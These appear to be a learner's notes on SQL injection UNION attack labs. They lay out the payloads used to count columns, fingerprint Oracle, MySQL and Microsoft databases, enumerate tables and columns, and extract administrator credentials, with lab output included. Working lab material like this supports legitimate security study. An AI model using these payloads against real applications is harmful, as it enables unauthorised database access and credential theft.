# SQL injection UNION attacks

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

## Determining the number of columns required in an SQL injection UNION attack

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

```
Note:

The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

' UNION SELECT NULL FROM DUAL--

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.
```

## Finding columns with a useful data type in an SQL injection UNION attack

```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,'WDSF9G',NULL--
```

## Using an SQL injection UNION attack to retrieve interesting data

```sql
' UNION SELECT username, password FROM users--
```

# Examining the database in SQL injection attacks

## Querying the database type and version

| Database type    | Query                    |
| ---------------- | ------------------------ |
| Microsoft, MySQL | SELECT @@version         |
| Oracle           | SELECT \* FROM v$version |
| PostgreSQL       | SELECT version()         |

```sql
' UNION SELECT @@version--
```

# Lab: SQL injection attack, querying the database type and version on Oracle

### step1

```sql
' UNION SELECT 'abc','def' FROM dual--
```

or

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### step2

```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

or

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

> _The BANNER displays the database release and version number_

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

```SQL
'+UNION+SELECT+NULL-- +

'+UNION+SELECT+NULL,NULL-- +
```

for mysql version -- @@version

```sql
'+UNION+SELECT+'abc','def'-- +

'+UNION+SELECT+@@version,NULL-- +
```

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

```sql
SELECT * FROM information_schema.tables
-----------------------------------------
'+UNION+SELECT+'abc','def'--

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

```

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
------------------------------------------------------------------
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='Users' --

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

--------------------------------------------
administrable_role_authorizations
users_vbxvem



'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_vbxvem' --

username_myiekf
password_jmmuvv
-------------------------------------------------------------------------
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+administrator--

'+UNION+SELECT+username_myiekf,+password_jmmuvv+FROM+users_vbxvem--

administrator

z888yjo94b3dc8h6lh7a

login using username and password

```

# Lab: SQL injection attack, listing the database contents on Oracle

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

`SELECT * FROM all_tables`

```sql
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
```

USERS_WOVBIP

SELECT \* FROM all_tab_columns WHERE table_name = 'USERS'

```sql
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_WOVBIP' --
```

USERNAME_GONUHE
PASSWORD_JURDTC

```sql
'+UNION+SELECT+USERNAME_GONUHE,+PASSWORD_JURDTC+FROM+USERS_WOVBIP--
```

administrator
lhgjg7dv0mibjdif3qbp

# Retrieving multiple values within a single column

```sql
' UNION SELECT username || '~' || password FROM users--
```

double-pipe sequence `||` which is a string concatenation operator on Oracle
The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query will let you read all of the usernames and passwords, for example:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

```SQL
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,'abc'--

```

```SQL
' UNION SELECT username || '~' || password FROM users--


'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

administrator~wdtutsdxwxupiunyko0r
